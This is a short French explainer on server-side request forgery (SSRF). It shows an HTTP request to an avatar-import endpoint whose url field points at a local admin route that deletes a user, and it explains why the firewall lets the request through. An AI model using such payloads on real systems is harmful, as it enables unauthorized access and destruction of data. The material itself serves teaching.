# SSRF Server-Side Request Forgery

```http
POST /api/import-avatar HTTP/1.1
Host: site-vulnerable.example
Content-Type: application/x-www-form-urlencoded

url=http://127.0.0.1:8080/admin/delete-user?id=42
```

Le port `8080` est bloqué depuis Internet, mais comme la requête part du serveur lui-même (`127.0.0.1`), le pare-feu laisse passer et l'action d'administration s'exécute.